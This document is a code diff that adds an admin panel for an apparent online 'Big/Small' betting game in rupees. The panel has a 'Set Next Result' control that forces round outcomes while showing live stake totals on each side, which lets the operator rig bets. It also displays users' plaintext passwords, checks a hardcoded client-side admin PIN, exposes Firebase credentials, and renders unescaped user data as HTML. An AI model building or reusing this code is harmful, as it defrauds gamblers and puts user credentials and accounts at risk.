@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YGWIN | ADMIN BEAST</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        body { background: #020617; color: white; font-family: sans-serif; }
+        .glass-card { background: #0f172a; border: 1px solid #1e293b; border-radius: 1.5rem; padding: 1.2rem; margin-bottom: 1rem; }
+        .tab-btn.active { border-bottom: 3px solid #3b82f6; color: #3b82f6; }
+        .hidden { display: none !important; }
+        input { background: #1e293b !important; border: 1px solid #334155 !important; color: white !important; outline: none; }
+    </style>
+</head>
+<body class="pb-24">
+
+    <div id="login-screen" class="p-6 mt-20 text-center">
+        <h1 class="text-4xl font-black text-blue-500 mb-8 italic">YGWIN ADMIN</h1>
+        <div class="glass-card">
+            <input type="password" id="admin-pin" placeholder="Enter PIN" class="w-full p-4 rounded-xl mb-4 text-center text-xl">
+            <button onclick="accessAdmin()" class="w-full bg-blue-600 py-4 rounded-xl font-black italic">LOGIN</button>
+        </div>
+    </div>
+
+    <div id="admin-content" class="hidden">
+        <div class="sticky top-0 z-50 bg-[#020617] border-b border-slate-800 p-4">
+            <div class="flex justify-between items-center bg-blue-900/20 p-3 rounded-xl border border-blue-500/30">
+                <div class="text-left">
+                    <p class="text-[10px] text-blue-300 uppercase font-bold">Live Period</p>
+                    <p id="adm-period" class="text-sm font-mono font-bold text-white">----------</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-[10px] text-blue-300 uppercase font-bold">Timer</p>
+                    <p id="adm-timer" class="text-2xl font-black text-red-500 italic">00:00</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="p-4">
+            <div class="glass-card text-center shadow-2xl border-blue-500/20">
+                <p class="text-[10px] text-slate-400 uppercase font-bold mb-4">Set Next Result</p>
+                <div class="grid grid-cols-3 gap-2">
+                    <button onclick="setForce('Big')" class="bg-orange-600 py-4 rounded-xl font-black italic shadow-lg active:scale-90 transition">BIG</button>
+                    <button onclick="setForce('Small')" class="bg-indigo-600 py-4 rounded-xl font-black italic shadow-lg active:scale-90 transition">SMALL</button>
+                    <button onclick="setForce('Random')" class="bg-slate-700 py-4 rounded-xl text-[10px] font-bold">RANDOM</button>
+                </div>
+                <p class="mt-4 text-xs">Current Setup: <span id="active-mode" class="text-yellow-500 font-bold">Random</span></p>
+            </div>
+
+            <div class="flex gap-6 mb-6 px-2 border-b border-slate-800 overflow-x-auto no-scrollbar">
+                <button onclick="showTab('tab-bets')" class="tab-btn active pb-2 font-bold text-xs whitespace-nowrap">Bets</button>
+                <button onclick="showTab('tab-dep')" class="tab-btn pb-2 font-bold text-xs whitespace-nowrap">Deposits</button>
+                <button onclick="showTab('tab-wit')" class="tab-btn pb-2 font-bold text-xs whitespace-nowrap">Withdraws</button>
+                <button onclick="showTab('tab-users')" class="tab-btn pb-2 font-bold text-xs whitespace-nowrap">Users</button>
+            </div>
+
+            <div id="tab-bets" class="tab-content">
+                <div class="grid grid-cols-2 gap-3 mb-4">
+                    <div class="glass-card bg-orange-900/10 border-orange-500/20 text-center">
+                        <p class="text-[10px] text-orange-400">BIG AMOUNT</p>
+                        <p id="total-big" class="text-2xl font-black">₹0</p>
+                    </div>
+                    <div class="glass-card bg-indigo-900/10 border-indigo-500/20 text-center">
+                        <p class="text-[10px] text-indigo-400">SMALL AMOUNT</p>
+                        <p id="total-small" class="text-2xl font-black">₹0</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-dep" class="tab-content hidden">
+                <div id="dep-list" class="space-y-3"></div>
+            </div>
+
+            <div id="tab-wit" class="tab-content hidden">
+                <div id="wit-list" class="space-y-3"></div>
+            </div>
+
+            <div id="tab-users" class="tab-content hidden">
+                <div id="user-list" class="divide-y divide-slate-800"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBBlKPL2V0JKCYN_GBGGSqDBZr7kFNiKZc",
+            databaseURL: "https://beast-web-cff81-default-rtdb.firebaseio.com",
+            projectId: "beast-web-cff81",
+            appId: "1:457850837406:web:e98320812c8d1b16ddde8f"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function accessAdmin() {
+            if(document.getElementById('admin-pin').value === "myselfyg26") {
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('admin-content').classList.remove('hidden');
+                startAdminEngine();
+            } else { alert("ACCESS DENIED!"); }
+        }
+
+        function startAdminEngine() {
+            // Live Timer & Period Sync
+            setInterval(() => {
+                const now = new Date();
+                const ist = new Date(now.toLocaleString("en-US", {timeZone: "Asia/Kolkata"}));
+                const sec = ist.getSeconds(), rem = 60 - sec;
+                const totalMin = ist.getHours() * 60 + ist.getMinutes();
+                const pId = ist.toISOString().slice(0,10).replace(/-/g,"") + "1000" + (10001 + totalMin - 330);
+                
+                document.getElementById('adm-period').innerText = pId;
+                document.getElementById('adm-timer').innerText = `00:${rem < 10 ? '0'+rem : rem}`;
+            }, 1000);
+
+            // Force Status
+            db.ref('control/force').on('value', s => {
+                document.getElementById('active-mode').innerText = s.val() || 'Random';
+            });
+
+            // Live Bets
+            db.ref('live_bets').on('value', s => {
+                let b = 0, sm = 0;
+                s.forEach(c => {
+                    if(c.val().type === 'Big') b += c.val().amt; else sm += c.val().amt;
+                });
+                document.getElementById('total-big').innerText = "₹" + b;
+                document.getElementById('total-small').innerText = "₹" + sm;
+            });
+
+            // Deposits
+            db.ref('deposits').on('value', s => {
+                let h = "";
+                s.forEach(c => {
+                    let d = c.val();
+                    if(d.status === 'Pending') {
+                        h += `<div class="glass-card border-l-4 border-red-500">
+                            <div class="flex justify-between font-bold text-sm"><span>${d.phone}</span><span class="text-green-400">₹${d.amt}</span></div>
+                            <p class="text-[10px] text-slate-500 my-2">UTR: ${d.utr}</p>
+                            <div class="flex gap-2">
+                                <button onclick="actionDep('${c.key}','${d.phone}',${d.amt})" class="flex-1 bg-green-600 py-2 rounded-lg text-[10px] font-bold">APPROVE</button>
+                                <button onclick="db.ref('deposits/${c.key}').remove()" class="flex-1 bg-red-600 py-2 rounded-lg text-[10px] font-bold">REJECT</button>
+                            </div>
+                        </div>`;
+                    }
+                });
+                document.getElementById('dep-list').innerHTML = h || "<p class='text-center text-slate-500'>No Deposits</p>";
+            });
+
+            // Withdraws
+            db.ref('withdraws').on('value', s => {
+                let h = "";
+                s.forEach(c => {
+                    let w = c.val();
+                    if(w.status === 'Pending') {
+                        h += `<div class="glass-card border-l-4 border-yellow-500">
+                            <p class="text-[10px] text-slate-400">USER: ${w.phone} (Pass: ${w.pass})</p>
+                            <div class="flex justify-between items-center my-2">
+                                <span class="font-bold text-sm">${w.name}</span>
+                                <span class="text-yellow-500 font-black">₹${w.amt}</span>
+                            </div>
+                            <p class="text-blue-400 text-[10px] mb-3">${w.upi}</p>
+                            <div class="flex gap-2">
+                                <button onclick="actionWit('${c.key}','Approved')" class="flex-1 bg-blue-600 py-2 rounded-lg text-[10px] font-bold">APPROVE</button>
+                                <button onclick="actionWit('${c.key}','Rejected','${w.phone}',${w.amt})" class="flex-1 bg-red-600 py-2 rounded-lg text-[10px] font-bold">REJECT</button>
+                            </div>
+                        </div>`;
+                    }
+                });
+                document.getElementById('wit-list').innerHTML = h || "<p class='text-center text-slate-500'>No Withdraws</p>";
+            });
+
+            // User List
+            db.ref('users').on('value', s => {
+                let h = "";
+                s.forEach(c => {
+                    let u = c.val();
+                    h += `<div class="p-4 flex justify-between items-center">
+                        <div class="text-xs"><b>${u.phone}</b><br><span class="text-slate-500">P: ${u.pass}</span></div>
+                        <div class="text-green-400 font-bold">₹${(u.wallet||0).toFixed(2)}</div>
+                    </div>`;
+                });
+                document.getElementById('user-list').innerHTML = h;
+            });
+        }
+
+        function setForce(v) { db.ref('control/force').set(v).then(() => alert("Set to: " + v)); }
+        function showTab(id) {
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.remove('hidden');
+            event.currentTarget.classList.add('active');
+        }
+
+        function actionDep(key, phone, amt) {
+            db.ref('users/'+phone+'/wallet').transaction(c => (c || 0) + amt).then(() => {
+                db.ref('deposits/'+key).update({ status: 'Approved' });
+                alert("Deposit Approved!");
+            });
+        }
+
+        function actionWit(key, status, phone, amt) {
+            if(status === 'Rejected') db.ref('users/'+phone+'/wallet').transaction(c => (c || 0) + amt);
+            db.ref('withdraws/'+key).update({ status: status }).then(() => alert("Withdraw " + status));
+        }
+    </script>
+</body>
+</html>
